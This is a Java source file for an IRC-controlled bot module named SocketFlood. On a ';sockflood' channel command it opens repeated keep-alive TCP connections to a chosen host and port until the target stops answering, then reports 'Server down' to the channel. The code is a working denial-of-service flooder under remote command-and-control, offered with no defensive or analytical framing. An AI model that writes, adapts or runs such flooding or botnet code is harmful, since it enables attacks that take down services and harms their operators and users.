
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.Executors;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class SocketFlood implements Runnable, Handler {

    private String host;
    private int port;
    private int times;
    private int delay;
    private static boolean socketFlooding;

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";sockflood")) {
            startFlood(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]), Integer.parseInt(args[4]));
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Socket flooding started to " + args[1]);
            return true;
        } else if (args[0].equals(";stopsockflood")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Socket flooding stopped!");
            return true;
        }
        return false;
    }

    public void startFlood(String host, int port, int times, int delay) {
        this.host = host;
        this.port = port;
        this.times = times;
        this.delay = delay;
        Executors.newSingleThreadExecutor().execute(this);
    }

    @Override
    public void run() {
        socketFlooding = true;
        for (int i = 0; i < times; i++) {
            try {
                if (socketFlooding) {
                    Socket sock = new Socket(host, port);
                    sock.setKeepAlive(true);
                    Thread.sleep(delay);
                } else {
                    break;
                }
            } catch (Exception e) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Server down, flooding stopped!");
                break;
            }
        }
        IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Socket flooding finished!");
        socketFlooding = false;
    }
}
